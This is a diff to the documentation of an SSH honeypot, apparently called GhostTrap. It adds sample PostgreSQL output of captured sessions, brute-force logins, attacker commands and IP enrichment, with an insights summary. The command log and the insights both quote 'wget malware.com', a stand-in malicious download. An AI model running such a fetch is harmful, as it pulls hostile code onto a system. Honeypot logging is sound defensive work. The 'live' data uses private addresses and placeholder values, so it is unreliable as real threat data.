@@ -117,7 +117,7 @@ CREATE TABLE commands (
 
 ---
 
-### 4. IP Intelligence (Future Use)
+### 4. IP Intelligence 
 
 Enrichment layer for threat intelligence.
 
@@ -198,4 +198,120 @@ ORDER BY id DESC;
 
 ---
 
+
+##  Sample Data (Live Capture)
+
+The following examples demonstrate real data captured by the GhostTrap SSH honeypot and stored in PostgreSQL.
+
+---
+
+###  Sessions
+
+Tracks attacker sessions with timestamps and source IP.
+
+```sql
+SELECT session_id, src_ip, start_time, end_time FROM sessions;
+```
+
+```
+              session_id              |     src_ip     |         start_time         |          end_time          
+--------------------------------------+----------------+----------------------------+----------------------------
+ 3dd710a9-2d14-4e58-92d2-234cbdd7eb97 | 192.168.31.116 | 2026-03-27 19:49:51.39644  | 2026-03-27 19:50:26.419325
+ 2f767e57-762c-40ae-a4c8-6d278a67c46f | 192.168.31.212 | 2026-03-27 19:52:10.361886 | 2026-03-27 20:04:21.695767
+ 1079c4e6-d508-4724-b097-1a9e59c959ad | 192.168.31.116 | 2026-03-27 19:50:29.209798 | 2026-03-27 20:24:33.976964
+ 89983ecb-8e90-4b55-a7fb-0be19175354d | 192.168.31.116 | 2026-03-27 20:45:57.908732 | 2026-03-27 20:46:34.895611
+```
+
+---
+
+###  Login Attempts
+
+Captures brute-force attempts including credentials and success status.
+
+```sql
+SELECT username, password, attempt_number, success 
+FROM login_attempts;
+```
+
+```
+ username | password | attempt_number | success 
+----------+----------+----------------+---------
+ root     | asd      |              1 | f
+ root     | asd      |              2 | t
+ root     | kk       |              1 | f
+ root     | kk       |              2 | t
+ root     | sasd     |              1 | f
+ root     | asd      |              2 | t
+ ubuntu   | sdf      |              1 | f
+ ubuntu   | sdf      |              2 | t
+```
+
+---
+
+###  Commands Executed
+
+Logs attacker behavior after gaining access.
+
+```sql
+SELECT command, cwd 
+FROM commands 
+ORDER BY id DESC;
+```
+
+```
+ command            |     cwd      
+--------------------+--------------
+ exit               | /home/ubuntu
+ ls                 | /home/ubuntu
+ clear              | /home/ubuntu
+ exit               | /home/ubuntu
+ exit               | /home/ubuntu
+ clear              | /home/ubuntu
+ wget malware.com   | /home/ubuntu
+ wget               | /home/ubuntu
+ ls                 | /home/ubuntu
+ clear              | /home/ubuntu
+ exit               | /home/ubuntu
+ id                 | /home/ubuntu
+ whoami             | /home/ubuntu
+ pwd                | /home/ubuntu
+ ls                 | /home/ubuntu
+ clear              | /home/ubuntu
+```
+
+---
+
+###  IP Intelligence
+
+Enriched attacker IP metadata stored for analysis.
+
+```sql
+SELECT ip, country, city, asn, isp FROM ip_intel;
+```
+
+```
+   ip    |    country    |  city   |        asn         |    isp     
+---------+---------------+---------+--------------------+------------
+ 8.8.8.8 | United States | Ashburn | AS15169 Google LLC | Google LLC
+```
+
+---
+
+##  Insights
+
+From the collected data, we can observe:
+
+* Repeated brute-force attempts with common credentials (`root`, `ubuntu`)
+* Automated login behavior (multiple attempts before success)
+* Post-compromise activity such as:
+
+  * reconnaissance (`whoami`, `id`, `pwd`)
+  * filesystem exploration (`ls`)
+  * potential malware download attempts (`wget malware.com`)
+* IP-level intelligence enabling:
+
+  * ASN-based attribution
+  * Geographic distribution analysis
+
+---
 
